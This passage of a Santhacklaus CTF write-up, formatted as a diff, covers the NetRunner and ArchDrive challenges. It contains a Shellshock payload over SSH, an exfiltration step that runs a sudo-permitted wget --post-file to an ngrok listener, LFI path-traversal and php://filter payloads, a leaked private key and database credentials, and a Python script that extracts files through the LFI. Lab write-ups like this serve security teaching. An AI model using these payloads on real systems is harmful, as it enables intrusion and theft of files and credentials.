+3cVH+cXsgSyAUMbPLneQh62pcNnR5vDwgAdXNSzYegzl9yL3kfl4s9foahIh4zqZ
+hqnFA1cG9zAcsd9Thy9f/3cz2iVvTpDZZ9glQR9d9C+3bnFU54uzdUKPYVEif3NU
+K1xreCkmAWdrAHhiA89skiVryPK3pVOKjHnAfyLrf27aZkiS3jvq/V+DDstKNZ2y
+ncjE2bXV8Kbzf5ifvikciUMTxnF7l+PehJulNP2+Mk5NBXOAcZdjO7sfxA==
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<pre><code class="language-bash">$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021   
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
+
+
+████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████
+
+
+----------------------------- General Informations -----------------------------
+
+Software Version     ::: 10.5.2546_b1 [OBSOLETE]
+Client ID            ::: 1534D 4245 97554 P
+
+General health       ::: [ALIVE]
+
+Management interface ::: [ONLINE]
+Maintenance link     ::: [ONLINE]
+
+
+
+----------------------- Installed Cybernetic Prosthetics -----------------------
+
+Zetatech Neural Processor MK.II   ::: [CONNECTION ERROR]
+Zetatech Enforcement 10.A Sidearm ::: [NOT CONNECTED]
+Zetatech Binoculars BT.4          ::: [NOT CONNECTED]
+
+
+Connection to 51.75.202.113 closed.
+</code></pre>
+
+<p>Ok, the server is printing the above message and immediatly close the ssh connection.</p>
+
+<h2 id="exploitation-1">Exploitation</h2>
+
+<p>In this challenge, you have to find a way to keep the session open. I first tried to use <code>-N</code> parameter of SSH, but it doesn&rsquo;t work.</p>
+
+<p>So I asked to Google: <a href="http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf">http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf</a></p>
+
+<p>And finally found this writeup: <a href="https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8">https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8</a></p>
+
+<p>So, go on, I tried with a Shellshock payload:</p>
+
+<pre><code class="language-bash">$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021 '() { :;}; /bin/bash'
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
+ls
+client.note
+status.sh
+tech.note
+id
+uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
+</code></pre>
+
+<p>It work! But before going further, I want to have a fully functionnal bash: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+
+<pre><code class="language-bash"># On remote server
+$ which python3
+/usr/bin/python3
+
+$ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+puppet-master@2a87f3ade358:~$ # Do CTRL + Z to suspend to current job
+
+# On localhost
+localhost $ stty raw -echo 
+localhost $ fg # It will not be display
+localhost $ reset 
+reset: unknown terminal type unknown
+Terminal type? xterm
+
+# On remote server
+puppet-master@2a87f3ade358:~$ id
+uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/netrunner1_4.gif" alt="" />
+<em>Fig 2</em>: Full interactive shell
+</center></p>
+
+<p>And now we got auto-completion, we can use CTRL + C, we can edit files with vim :D</p>
+
+<pre><code class="language-bash">puppet-master@2a87f3ade358:~$ cat client.note 
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+:::: Client Note ::::
+
+You can access to your web interface to have more informations.
+You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
+If you have any issues with Zetatech products, please contact us.
+
+Note: the password is the same than your username.
+
+:: IMTLD{Pr0t3ct_Y0uR_Gh0sT}
+</code></pre>
+
+<h2 id="flag-32">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Pr0t3ct_Y0uR_Gh0sT}</p>
+</blockquote>
+
+<h1 id="netrunner-3-3">NetRunner <sup>3</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>NetRunner <sup>3</sup>&frasl;<sub>3</sub></td>
+<td>App-Script</td>
+<td>450</td>
+<td>18</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-33">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_netrunner3.png" alt="" />
+<em>Fig 1</em>: &ldquo;NetRunner <sup>3</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-20">State of the art</h2>
+
+<p>At this point, the goal is pretty obvious: get privileged access. During a pentest there are some attack vectors:</p>
+
+<ul>
+<li>sudo misconfigured</li>
+<li>crontab or services running as privileged user</li>
+<li>suid binary or script to exploit</li>
+</ul>
+
+<h2 id="sudo-misconfigured">Sudo misconfigured</h2>
+
+<p>Here, this is a misconfigured sudo:</p>
+
+<pre><code class="language-bash">$ sudo -l 
+[sudo] password for puppet-master: puppet-master
+Matching Defaults entries for puppet-master on 2a87f3ade358:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    lecture=never
+
+User puppet-master may run the following commands on 2a87f3ade358:
+    (puppet-master : zetatech-maintenance) /usr/bin/wget
+</code></pre>
+
+<p>Most of the time, the user can run a command as root without password. In this case, the vulnerability comes with the <code>zetatech-maintenance</code> group.</p>
+
+<p>What could happen if we execute command with this group? We will getting group right :D</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>I don&rsquo;t have my VPS under my hand, then I will use <code>ngrok</code>, it allows us to open a port through their server and listen / send data on it: <a href="https://ngrok.com/">https://ngrok.com/</a></p>
+
+<p>It works like that (picture from their official website):</p>
+
+<p><center>
+<img src="https://ngrok.com/static/img/demo.png" alt="" />
+</center></p>
+
+<ol>
+<li>First localhost terminal:</li>
+</ol>
+
+<pre><code class="language-bash">$ ngrok tcp 1223
+[...]
+Web interface 
+http://127.0.0.1:4040
+
+Forwarding
+tcp://0.tcp.ngrok.io:15462 -&gt; localhost:1223        
+[...]      
+</code></pre>
+
+<ol>
+<li>Second local host terminal</li>
+</ol>
+
+<pre><code class="language-bash">$ ping 0.tcp.ngrok.io                        
+PING 0.tcp.ngrok.io (52.15.72.79) 56(84) bytes of data.
+^C
+--- 0.tcp.ngrok.io ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms
+
+$ nc -lvp 1223       
+Listening on [0.0.0.0] (family 0, port 1223)
+</code></pre>
+
+<ol>
+<li>On remote server terminal</li>
+</ol>
+
+<pre><code class="language-bash">puppet-master@2a87f3ade358:~$ sudo -g zetatech-maintenance wget --post-file /home/puppet-master/tech.not http://52.15.72.79:15462
+</code></pre>
+
+<p>And magic appears in our second localhost terminal:</p>
+
+<pre><code class="language-bash">$ nc -lvp 1223       
+Listening on [0.0.0.0] (family 0, port 1223)
+Connection from localhost 53726 received!
+POST / HTTP/1.1
+User-Agent: Wget/1.18 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 52.15.72.79:15462
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 266
+
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+:::: Admin Note ::::
+
+Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.
+
+:: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
+</code></pre>
+
+<h2 id="flag-33">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}</p>
+</blockquote>
+
+<h1 id="archdrive-1-3">ArchDrive <sup>1</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>ArchDrive <sup>1</sup>&frasl;<sub>3</sub></td>
+<td>Web</td>
+<td>150</td>
+<td>53</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-34">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_archdrive1.png" alt="" />
+<em>Fig 1</em>: &ldquo;ArchDrive <sup>1</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-21">State of the art</h2>
+
+<p>This comes with a really good looking website:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive1_1.png" alt="" />
+<em>Fig 1</em>: ArchDrive index
+</center></p>
+
+<p>I notice a strange GET parameter when clicking on <code>Reset it</code>:</p>
+
+<blockquote>
+<p><a href="https://archdrive.santhacklaus.xyz/?page=reset.php">https://archdrive.santhacklaus.xyz/?page=reset.php</a></p>
+</blockquote>
+
+<h2 id="basic-local-file-inclusion">Basic local file inclusion</h2>
+
+<p>I tried to include <code>/etc/passwd</code> file:</p>
+
+<blockquote>
+<p><a href="https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd">https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd</a></p>
+</blockquote>
+
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash
+</code></pre>
+
+<p>w00t!</p>
+
+<h2 id="flag-34">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}</p>
+</blockquote>
+
+<h1 id="archdrive-2-3">ArchDrive <sup>2</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>ArchDrive <sup>2</sup>&frasl;<sub>3</sub></td>
+<td>Web</td>
+<td>150</td>
+<td>28</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-35">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_archdrive2.png" alt="" />
+<em>Fig 1</em>: &ldquo;ArchDrive <sup>2</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-22">State of the art</h2>
+
+<p>Ok, we got a <strong>Local file inclusion</strong>, let&rsquo;s try to use the base64 php wrapper (go on payload all the things):</p>
+
+<blockquote>
+<p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php</a></p>
+</blockquote>
+
+<p>It gives me some base64 data, here is the decoded data:</p>
+
+<pre><code class="language-php">&lt;?php session_start(); ?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;title&gt;Reset Your Password&lt;/title&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+&lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;images/icons/favicon.ico&quot;/&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/bootstrap/css/bootstrap.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;fonts/font-awesome-4.7.0/css/font-awesome.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;fonts/iconic/css/material-design-iconic-font.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/animate/animate.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/css-hamburgers/hamburgers.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/animsition/css/animsition.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/select2/select2.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/daterangepicker/daterangepicker.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/util.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;limiter&quot;&gt;
+    &lt;div class=&quot;container-login100&quot;&gt;
+        &lt;div class=&quot;wrap-login100&quot;&gt;
+            &lt;form class=&quot;login100-form validate-form&quot; method=&quot;post&quot; action=&quot;?page=reset.php&quot;&gt;
+&lt;span class=&quot;login100-form-title p-b-48&quot;&gt;
+&lt;a href=&quot;index.php&quot;&gt;&lt;img class=&quot;logo-brand&quot; src=&quot;images/archdrive-color.png&quot; alt=&quot;ArchDrive logo&quot;&gt;&lt;/a&gt;
+&lt;/span&gt;
+&lt;span class=&quot;login100-form-title p-b-26&quot;&gt;
+ArchDrive
+&lt;/span&gt;
+&lt;p class=&quot;login100-form-title&quot; style=&quot;font-size: 24px&quot;&gt;Reset My Password&lt;/p&gt;&lt;/br&gt;
+
+&lt;?php
+    if(isset($_POST['recover']))
+    {
+    ?&gt;
+&lt;p&gt;Email sent !&lt;/p&gt;
+&lt;?php
+    }
+    ?&gt;
+
+
+&lt;div class=&quot;wrap-input100 validate-input&quot; data-validate = &quot;Valid email is: a@b.c&quot;&gt;
+&lt;input class=&quot;input100&quot; type=&quot;text&quot; name=&quot;email&quot;&gt;
+&lt;span class=&quot;focus-input100&quot; data-placeholder=&quot;Email (only from @archdrive.corp)&quot;&gt;&lt;/span&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;container-login100-form-btn&quot;&gt;
+&lt;div class=&quot;wrap-login100-form-btn&quot;&gt;
+&lt;div class=&quot;login100-form-bgbtn&quot;&gt;&lt;/div&gt;
+&lt;button class=&quot;login100-form-btn&quot; name=&quot;recover&quot;&gt;Recover Password&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+
+&lt;div id=&quot;dropDownSelect1&quot;&gt;&lt;/div&gt;
+
+&lt;script src=&quot;vendor/jquery/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/animsition/js/animsition.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/bootstrap/js/popper.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/bootstrap/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/select2/select2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/daterangepicker/moment.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/daterangepicker/daterangepicker.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;vendor/countdowntime/countdowntime.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h2 id="local-file-inclusion">Local file inclusion</h2>
+
+<p>The <strong>index.php</strong> file doesn&rsquo;t work, I didn&rsquo;t succeed to extracted it. Nevermind, there is a <strong>login.php</strong> file, found in the index form:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/archdrive2_1.png" alt="" />
+<em>Fig 2</em>: login.php file
+</center></p>
+
+<p>Then:</p>
+
+<blockquote>
+<p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php</a></p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php
+  session_start();
+
+  $state = new \stdClass();
+
+  if ( isset($_POST['email']) &amp;&amp; !empty($_POST['email']) ) {
+    if ( isset($_POST['pass']) &amp;&amp; !empty($_POST['pass']) ) {
+
+      $bdd = mysqli_connect('database:3306', 'archdrive-corpo-bdd-admin', '8mkxdcwwyvtk36snF2b4TcEqSjh4Cc', 'ctf-archdrive-corp');
+      if (mysqli_connect_errno()) {
+          $state-&gt;return = 'error';
+          $state-&gt;string = 'Connection error';
+          $state_json = json_encode($state);
+          echo $state_json;
+          return;
+      }
+
+      $user = mysqli_real_escape_string($bdd, strtolower($_POST['email']));
+      $pass = $_POST['pass'];
+$sql = &quot;SELECT user,password FROM `access-users` WHERE user='&quot;.$user.&quot;' AND password='&quot;.$pass.&quot;'&quot;;
+
+      $res = mysqli_query($bdd, $sql);
+
+      $num_row = mysqli_num_rows($res);
+      $row=mysqli_fetch_assoc($res);
+
+        if ( $num_row == 1 &amp;&amp; $user === $row['user']) {
+            $state-&gt;return = 'true';
+            $_SESSION['logged'] = 1;
+            header(&quot;Location: myfiles.php&quot;);
+
+      } else {
+          $state-&gt;return = 'false';
+          header(&quot;Location: index.php&quot;);
+      }
+    }
+  }
+?&gt;
+</code></pre>
+
+<p>Great, new file appeared: <strong>myfiles.php</strong></p>
+
+<blockquote>
+<p><a href="https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php">https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php</a></p>
+</blockquote>
+
+<pre><code class="language-php">&lt;?php session_start();
+
+    if($_SESSION['logged'] === 1)
+    {
+    ?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;title&gt;My Files&lt;/title&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+  &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;images/icons/favicon.ico&quot;/&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/bootstrap/css/bootstrap.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;fonts/font-awesome-4.7.0/css/font-awesome.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;fonts/iconic/css/material-design-iconic-font.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/animate/animate.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/css-hamburgers/hamburgers.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/animsition/css/animsition.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/select2/select2.min.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;vendor/daterangepicker/daterangepicker.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/util.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class=&quot;limiter&quot;&gt;
+    &lt;div class=&quot;container-login100&quot;&gt;
+      &lt;div class=&quot;wrap-login100&quot;&gt;
+          &lt;span class=&quot;login100-form-title p-b-48&quot;&gt;
+            &lt;a href=&quot;index.php&quot;&gt;&lt;img class=&quot;logo-brand&quot; src=&quot;images/archdrive-color.png&quot; alt=&quot;ArchDrive logo&quot;&gt;&lt;/a&gt;
+          &lt;/span&gt;
+          &lt;span class=&quot;login100-form-title p-b-26&quot;&gt;
+            ArchDrive
+          &lt;/span&gt;
+
+    &lt;p class=&quot;login100-form-title&quot; style=&quot;font-size: 24px&quot;&gt;My Recent Documents&lt;/p&gt;&lt;/br&gt;
+            &lt;ul&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/rib-bnp.gif&quot;&gt;rib-bnp.gif&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/test.html&quot;&gt;test.html&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;images/vacances1.jpg&quot;&gt;Vacances_2018_1.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip&quot;&gt;CONFIDENTIEL.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png&quot;&gt;facture_mobile_sfr.png&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/camel.jpg&quot;&gt;camel.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/cat.jpg&quot;&gt;cat.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/documents&quot;&gt;documents&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/funny_wtf.jpg&quot;&gt;funny_wtf.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/freshandhappy.mp3&quot;&gt;freshandhappy.mp3&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/intense.mp3&quot;&gt;intense.mp3&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/recup.zip&quot;&gt;recup.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/funny.jpg&quot;&gt;funny.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/goats.jpg&quot;&gt;goats.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/lol.jpg&quot;&gt;lol.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/rapport_SM.pdf&quot;&gt;rapport_SM.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/media&quot;&gt;media&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/these.pdf&quot;&gt;these.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/these-2.pdf&quot;&gt;these-2.pdf&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/wallpaper.jpg&quot;&gt;wallpaper.jpg&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a class=&quot;txt2&quot; href=&quot;21f64da1e5792c8295b964d159a14491/VeraCrypt.zip&quot;&gt;VeraCrypt.zip&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+
+&lt;div class=&quot;text-center p-t-115&quot;&gt;
+&lt;form method=&quot;post&quot; action=&quot;logout.php&quot;&gt;
+&lt;button class=&quot;txt2&quot; value=&quot;disconnect&quot;&gt;
+Log out.
+&lt;/button&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+
+  &lt;div id=&quot;dropDownSelect1&quot;&gt;&lt;/div&gt;
+
+  &lt;script src=&quot;vendor/jquery/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/animsition/js/animsition.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/bootstrap/js/popper.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/bootstrap/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/select2/select2.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/daterangepicker/moment.min.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/daterangepicker/daterangepicker.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;vendor/countdowntime/countdowntime.js&quot;&gt;&lt;/script&gt;
+  &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;?php
+    }
+    else
+    {
+        include('error.php');
+    }
+?&gt;
+</code></pre>
+
+<h2 id="file-extraction">File extraction</h2>
+
+<p>Ok, now I think I&rsquo;m seeing files stored in the drive, I made a little script to extract them:</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+import requests
+import base64
+
+file_list = ['21f64da1e5792c8295b964d159a14491/rib-bnp.gif', '21f64da1e5792c8295b964d159a14491/test.html', 'images/vacances1.jpg', '21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip', '21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png', '21f64da1e5792c8295b964d159a14491/camel.jpg', '21f64da1e5792c8295b964d159a14491/cat.jpg', '21f64da1e5792c8295b964d159a14491/funny_wtf.jpg', '21f64da1e5792c8295b964d159a14491/freshandhappy.mp3', '21f64da1e5792c8295b964d159a14491/intense.mp3', '21f64da1e5792c8295b964d159a14491/recup.zip', '21f64da1e5792c8295b964d159a14491/funny.jpg', '21f64da1e5792c8295b964d159a14491/goats.jpg', '21f64da1e5792c8295b964d159a14491/lol.jpg', '21f64da1e5792c8295b964d159a14491/rapport_SM.pdf', '21f64da1e5792c8295b964d159a14491/these.pdf', '21f64da1e5792c8295b964d159a14491/these-2.pdf', '21f64da1e5792c8295b964d159a14491/wallpaper.jpg', '21f64da1e5792c8295b964d159a14491/VeraCrypt.zip','21f64da1e5792c8295b964d159a14491/media','21f64da1e5792c8295b964d159a14491/documents']
+
+for i in file_list:
+  r = requests.get(&quot;https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource=&quot;+str(i))
+  data = base64.b64decode(r.text.split('\r\n')[-1].replace(' ',''))
+
+  filename = i.replace('/','_')
+  print(&quot;[+] Result written in: {0}&quot;.format(filename))
+  f = open(filename, 'wb')
+  f.write(data)
+  f.close()
+</code></pre>
+
